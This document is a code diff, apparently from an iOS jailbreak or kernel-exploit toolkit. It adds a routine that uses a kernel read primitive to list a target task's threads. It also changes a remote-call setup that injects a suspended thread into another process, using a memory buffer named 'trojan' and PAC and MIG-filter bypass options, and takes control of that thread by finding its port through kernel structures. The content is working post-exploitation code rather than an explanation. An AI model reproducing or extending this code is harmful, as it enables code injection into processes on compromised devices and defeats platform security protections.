@@ -1581,6 +1581,19 @@ uint64_t retry_first_thread(bool useMigFilterBypass) {
     return kread64(g_RC_taskAddr + off_task_threads_next);
 }
 
+static NSArray<NSNumber *> *collect_all_task_threads(uint64_t taskAddr) {
+    NSMutableArray<NSNumber *> *list = [NSMutableArray new];
+    if (!taskAddr || !is_kaddr_valid(taskAddr)) return list;
+    uint64_t curr = kread64(taskAddr + off_task_threads_next);
+    int count = 0;
+    while (curr && is_kaddr_valid(curr) && count < 512) {
+        [list addObject:@(curr)];
+        curr = kread64(curr + off_thread_task_threads_next);
+        count++;
+    }
+    return list;
+}
+
 // NOTE: Do not run this function while "attaching xcode" on iOS 18+, it will make device unstable.
 int init_remote_call(const char* process, bool useMigFilterBypass) {
     clear_remote_shmem_cache();
@@ -2034,6 +2047,8 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
             startKind = "pac_0x301";
         }
 
+        NSArray<NSNumber *> *threadsBefore = collect_all_task_threads(g_RC_taskAddr);
+
         RC_DIAG("pthread_create_suspended_np start=%s 0x%llx out=SP-0x100=0x%llx (immediate)",
                 startKind, (unsigned long long)startRoutine,
                 (unsigned long long)trojanMemTemp);
@@ -2041,6 +2056,7 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
                                                     trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
         uint64_t pthreadAddr = 0;
+        uint64_t newThreadAddr = 0;
         if (g_RC_success && createResult == 0) {
             uint64_t heapBounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
             if (g_RC_success && heapBounce) {
@@ -2059,6 +2075,20 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                 RC_DIAG("post-pthread bounce miss — raw remapped read=0x%llx",
                         (unsigned long long)pthreadAddr);
             }
+
+            NSArray<NSNumber *> *threadsAfter = collect_all_task_threads(g_RC_taskAddr);
+            for (NSNumber *n in threadsAfter) {
+                if (![threadsBefore containsObject:n]) {
+                    newThreadAddr = n.unsignedLongLongValue;
+                    break;
+                }
+            }
+            if (newThreadAddr && is_kaddr_valid(newThreadAddr)) {
+                RC_DIAG("found synthetic thread kaddr=0x%llx (before=%lu after=%lu)",
+                        (unsigned long long)newThreadAddr,
+                        (unsigned long)threadsBefore.count,
+                        (unsigned long)threadsAfter.count);
+            }
         } else {
             RC_DIAG("pthread_create_suspended_np failed result=%llu success=%d — thread[1]",
                     (unsigned long long)createResult, (int)g_RC_success);
@@ -2076,8 +2106,18 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
                     callThreadPort = 0;
                 }
             } else {
-                RC_DIAG("pthread_mach_thread_np failed — thread[1]");
+                RC_DIAG("pthread_mach_thread_np returned 0 (expected for suspended) — resolving port via kernel");
                 callThreadPort = 0;
+            }
+
+            if (!callThreadPort && newThreadAddr && is_kaddr_valid(newThreadAddr)) {
+                callThreadPort = task_find_port_for_thread(g_RC_taskAddr, newThreadAddr);
+                RC_DIAG("synthetic thread port from task_find_port_for_thread = 0x%llx",
+                        (unsigned long long)callThreadPort);
+                if (callThreadPort) {
+                    g_RC_callThreadAddr = newThreadAddr;
+                    createdSuspended = true;
+                }
             }
         } else {
             RC_DIAG("create miss (bounce=0x%llx) — falling through to thread[1] TRO-swap",
